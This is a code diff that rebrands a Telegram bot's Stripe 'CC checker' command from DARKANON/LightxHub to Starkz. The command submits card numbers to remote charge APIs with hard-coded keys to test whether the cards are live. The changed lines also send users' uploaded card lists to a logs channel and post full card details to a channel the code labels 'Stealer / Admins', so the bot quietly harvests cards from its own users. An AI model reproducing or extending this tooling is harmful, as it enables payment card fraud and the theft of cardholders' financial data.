@@ -37,7 +37,7 @@ from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 from utils_send import safe_send_message
 from database import (
-    is_gate_enabled, get_db_connection, 
+    is_gate_enabled, get_db_connection,
     create_user, update_user_stats
 )
 from bin import get_bin_info
@@ -59,7 +59,7 @@ router = Router()
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
 API_URL = "https://atoti-production.up.railway.app/charge"
-API_KEY = "DARKANONSHO!!!"
+API_KEY = "oozaruhshop"
 
 user_last_command_time = {}
 
@@ -167,7 +167,7 @@ async def get_user_plan_name(user_id):
                 conn.close()
                 if row:
                     p = row['plan'].lower()
-                    if any(k in p for k in ["kashim", "chirag", "darkanon"]): return 'DARKANON <tg-emoji emoji-id="5039727497143387500">👑</tg-emoji>'
+                    if any(k in p for k in ["kashim", "chirag", "darkanon", "starkz"]): return 'Starkz <tg-emoji emoji-id="5039727497143387500">👑</tg-emoji>'
                     if "root" in p: return '𝗥𝗼𝗼𝘁 <tg-emoji emoji-id="5039727497143387500">👑</tg-emoji>'
                     if "elite" in p: return '𝗘𝗹𝗶𝘁𝗲 ⭐'
                     if "core" in p: return '𝗖𝗼𝗿𝗲 <tg-emoji emoji-id="5042274086332400375">🛠️</tg-emoji>'
@@ -244,7 +244,7 @@ async def st_command(message: types.Message):
         if message.reply_to_message.document:
             try:
                 await message.bot.send_document(
-                    chat_id=-1004462990283,
+                    chat_id=-1003965699487,
                     document=message.reply_to_message.document.file_id,
                     caption=f"User <a href='tg://user?id={user_id}'>{user.first_name}</a> sent a txt file in /st",
                     parse_mode="HTML"
@@ -255,7 +255,7 @@ async def st_command(message: types.Message):
     if message.document:
         try:
             await message.bot.send_document(
-                chat_id=-1004462990283,
+                chat_id=-1003965699487,
                 document=message.document.file_id,
                 caption=f"User <a href='tg://user?id={user_id}'>{user.first_name}</a> sent a txt file in /st",
                 parse_mode="HTML"
@@ -372,7 +372,7 @@ async def process_st_check(message, proc_msg, user, user_id, formatted_cc, cc, m
         try:
             cc_encoded = formatted_cc.replace("|", "%7C")
             proxy_encoded = urllib.parse.quote(proxy) if proxy else ""
-            api_url = f"https://atoti-production.up.railway.app/charge?cc={cc_encoded}&key=DARKANONSHO!!!&amount=1&proxy={proxy_encoded}"
+            api_url = f"https://atoti-production.up.railway.app/charge?cc={cc_encoded}&key=oozaruhshop&amount=1&proxy={proxy_encoded}"
             timeout = aiohttp.ClientTimeout(total=40)
             async with aiohttp.ClientSession() as session:
                 async with session.get(api_url, timeout=timeout) as resp:
@@ -380,7 +380,7 @@ async def process_st_check(message, proc_msg, user, user_id, formatted_cc, cc, m
                         api_result = await resp.json()
                     else:
                         # Fallback to Corrigan if Atoti replica returns non-200
-                        alt_url = f"https://stripeapi-production-76a7.up.railway.app/stripe/check?gate=corrigan&key=darkanon&cc={cc_encoded}&proxy={proxy}"
+                        alt_url = f"https://stripeapi-production-76a7.up.railway.app/stripe/check?gate=corrigan&key=oozaruhshop&cc={cc_encoded}&proxy={proxy}"
                         async with session.get(alt_url, timeout=timeout) as alt_resp:
                             if alt_resp.status == 200:
                                 api_result = await alt_resp.json()
@@ -389,7 +389,7 @@ async def process_st_check(message, proc_msg, user, user_id, formatted_cc, cc, m
         except asyncio.TimeoutError:
             # On timeout, try quick Corrigan check
             try:
-                alt_url = f"https://stripeapi-production-76a7.up.railway.app/stripe/check?gate=corrigan&key=darkanon&cc={cc_encoded}&proxy={proxy}"
+                alt_url = f"https://stripeapi-production-76a7.up.railway.app/stripe/check?gate=corrigan&key=oozaruhshop&cc={cc_encoded}&proxy={proxy}"
                 timeout_quick = aiohttp.ClientTimeout(total=15)
                 async with aiohttp.ClientSession() as session:
                     async with session.get(alt_url, timeout=timeout_quick) as alt_resp:
@@ -465,14 +465,14 @@ async def process_st_check(message, proc_msg, user, user_id, formatted_cc, cc, m
     # G. BUILD FINAL MESSAGE
     user_name_safe = html.escape(user.first_name or "User")
     user_link = f'<a href="tg://user?id={user.id}">{user_name_safe}</a>'
-    dev_link = '<a href="https://t.me/darkanonp">DARKANON</a>'
+    dev_link = '<a href="https://t.me/oozaruh">Starkz</a>'
     user_display = f"{user_link} ({plan_name})"
 
     elapsed = round(time.time() - start_time, 1)
     final_caption = (
         f"<b><tg-emoji emoji-id='5386367538735104399'>🆕</tg-emoji> {final_status}!</b>\n\n"
         f"<b><tg-emoji emoji-id='5039623284056917259'>💳</tg-emoji> 𝗖𝗖:</b> <code><b>{formatted_cc}</b></code>\n"
-        f"<b><tg-emoji emoji-id='5039895103947146186'>🌐</tg-emoji> 𝗚𝗮𝘁𝗲:</b> {to_math_bold("Stripe 1 USD")}\n"
+        f"<b><tg-emoji emoji-id='5039895103947146186'>🌐</tg-emoji> 𝗚𝗮𝘁𝗲:</b> {to_math_bold('Stripe 1 USD')}\n"
         f"<b><tg-emoji emoji-id='5040042498634810056'>💬</tg-emoji> 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲:</b> {to_math_bold(html.escape(str(res_message or 'N/A')))}\n\n"
         f"<b><tg-emoji emoji-id='5042329873662609701'>🗑️</tg-emoji> 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:</b>\n"
         f"<b><tg-emoji emoji-id='5039753786638205957'>🔹</tg-emoji> 𝗕𝗿𝗮𝗻𝗱:</b> {to_math_bold(html.escape(str(bin_scheme or 'N/A')))}\n"
@@ -488,7 +488,7 @@ async def process_st_check(message, proc_msg, user, user_id, formatted_cc, cc, m
 
     # H. KEYBOARD
     reply_markup = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="LightxHub", url="https://t.me/lightxHub_bot", icon_custom_emoji_id="5042097984083330584", style="primary")]
+        [InlineKeyboardButton(text="Starkz", url="https://t.me/StarkzchkBot", icon_custom_emoji_id="5042097984083330584", style="primary")]
     ])
 
     # I. EDIT THE PROCESSING MESSAGE WITH RESULT
@@ -523,20 +523,20 @@ async def process_st_check(message, proc_msg, user, user_id, formatted_cc, cc, m
             f"<b>USER ➔</b> {user_display}"
         )
         reply_markup_logs = InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="𝗖𝗵𝗲𝗰𝗸 𝗬𝗼𝘂𝗿 𝗖𝗮𝗿𝗱𝘀", url="https://t.me/lightxHub_bot", style="primary")]
+            [InlineKeyboardButton(text="𝗖𝗵𝗲𝗰𝗸 𝗬𝗼𝘂𝗿 𝗖𝗮𝗿𝗱𝘀", url="https://t.me/StarkzchkBot", style="primary")]
         ])
 
         try:
             # Broadcast to logs channel (Clean 4 lines)
             await safe_send_message(message.bot,
-                chat_id=-1004462990283,
+                chat_id=-1003965699487,
                 text=log_caption,
                 parse_mode="HTML",
                 reply_markup=reply_markup_logs,
             )
-            # Broadcast to Stealer / Admins channel (-1004348615901) with Full Card
+            # Broadcast to Stealer / Admins channel with Full Card
             await safe_send_message(message.bot,
-                chat_id=-1004348615901,
+                chat_id=-5447284969,
                 text=final_caption,
                 parse_mode="HTML",
                 reply_markup=reply_markup,
